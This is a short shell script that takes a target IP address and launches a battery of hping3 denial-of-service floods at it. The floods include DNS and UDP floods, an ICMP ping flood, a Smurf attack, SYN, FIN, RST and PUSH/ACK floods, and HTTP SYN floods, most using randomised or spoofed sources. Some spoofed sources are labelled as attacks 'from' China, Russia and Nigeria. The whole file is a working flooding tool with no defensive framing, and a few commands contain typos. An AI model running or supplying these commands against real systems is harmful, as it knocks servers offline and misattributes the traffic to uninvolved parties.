#!/bin/sh
# Christopher Gray
# Version 0.2.18
#  2/26/2020

if [ -z "$1" ]; then
      echo "No dest defined to attack! please define one before continuing \r\n"
      exit
else
      server_ip=$1
      echo "Server is set to $server_ip \r\n"
fi

#---- Hping3 Attacks --------------------------------------------------------------------------------------------------
echo "Running HPing3 DNS flood attack script, toward port 53, from random sources... \r\n "
sudo hping3 --flood --rand-source --udp -p 53 $server_ip 2> /dev/null &

#echo "Running HPing3 attack script towards FTP... \r\n"
#sudo hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source $server_ip 2> /dev/null &

echo "Running ping flood attack from random sources \r\n"
sudo hping3 $server_ip --icmp --flood --rand-source 2> /dev/null &

echo "Smurf attack \r\n "
sudo hping3 --icmp --spoof $server_ip BROADCAST_IP 2> /dev/null &

#------------------------
echo "SYN Flood \r\n "
sudo hping3 -S --flood -V -p 0 $server_ip

echo "SYN Flood (Advanced) \r\n "
sudo hping3 -c 20000 -d 120 -S -w 64 -p 22 --flood --rand-source $server_ip 2> /dev/null &

echo "UDP FLood \r\n"
sudo hping3 --flood --rand-source --udp -p 22 $server_ip 2> /dev/null &

echo "TCP FIN flood \r\n"
sudo hping3 --flood --rand-source -F -p 0 $server_ip 2> /dev/null &

echo "TCP RST Flood \r\n"
sudo hping3 --flood --rand-source -R -p 0 $server_ip 2> /dev/null &

echo "PUSH and ACK Flood \r\n"
suod hping3 --flood --rand-source -PA -p 0 $server_ip 2> /dev/null &


#--- HTTP attacks ---
echo "Running HPing3 flood attack to HTTP \r\n "
sudo hping3 $server_ip -p 80 –SF --flood 2> /dev/null &

echo "Running syn flood attack from random sources, towards a webserver \r\n "
sudo hping3 --syn --flood --rand-source --win 65535 --ttl 64 --data 16000 --morefrag --baseport 49877 --destport 80 $server_ip 2> /dev/null &

#--- Attacks by Country -----
echo "Attack from China (1.92.0.10), on DNS.. \r\n"
hping3 --flood --udp -p 53 --spoof 1.92.0.10 $server_ip 2> /dev/null &

echo "Attack from Russia (2.72.0.10), on DNS.. \r\n"
hping3 --flood --udp -p 53 --spoof 2.72.0.10 $server_ip 2> /dev/null &

echo "Attack from Nigeria (77.70.128.10), on DNS.. \r\n"
hping3 --flood --udp -p 53 --spoof 77.70.128.10 $server_ip 2> /dev/null &
